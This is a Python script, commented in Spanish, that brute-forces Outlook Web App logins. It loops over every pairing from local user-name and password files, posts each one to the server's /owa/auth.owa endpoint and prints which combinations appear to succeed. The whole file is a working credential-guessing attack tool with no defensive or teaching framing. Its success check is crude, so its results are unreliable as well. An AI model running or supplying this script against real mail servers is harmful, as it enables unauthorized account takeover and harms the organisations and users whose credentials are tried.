import argparse
import requests

def args_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True, help="URL del servidor OWA")
    return parser.parse_args()

def load_credentials_from_file(filename):
    credentials = []
    with open(filename, 'r') as file:
        for line in file:
            credentials.append(line.strip())
    return credentials

def main():
    args = args_parse()
    owa_url = args.url
    usernames = load_credentials_from_file("usuarios.txt")  # Carga nombres de usuario desde un archivo
    passwords = load_credentials_from_file("contraseñas.txt")  # Carga contraseñas desde un archivo

    for username in usernames:
        for password in passwords:
            # Construye la solicitud HTTP POST para el inicio de sesión en OWA
            login_data = {
                "username": username,
                "password": password,
            }

            session = requests.Session()
            try:
                # Realiza la solicitud de inicio de sesión
                response = session.post(f"{owa_url}/owa/auth.owa", data=login_data)

                # Verifica si la respuesta indica un inicio de sesión exitoso o fallido
                if "Outlook Web App" in response.text:
                    print(f"Inicio de sesión exitoso para {username}:{password} en {owa_url}.")
                else:
                    print(f"Inicio de sesión fallido para {username}:{password} en {owa_url}.")

            except requests.exceptions.RequestException as e:
                # Captura errores de la solicitud HTTP
                print(f"Error para {username}:{password} en {owa_url}:", str(e))
            except Exception as e:
                # Captura errores inesperados
                print(f"Error inesperado para {username}:{password} en {owa_url}:", str(e))

if __name__ == '__main__':
    main()
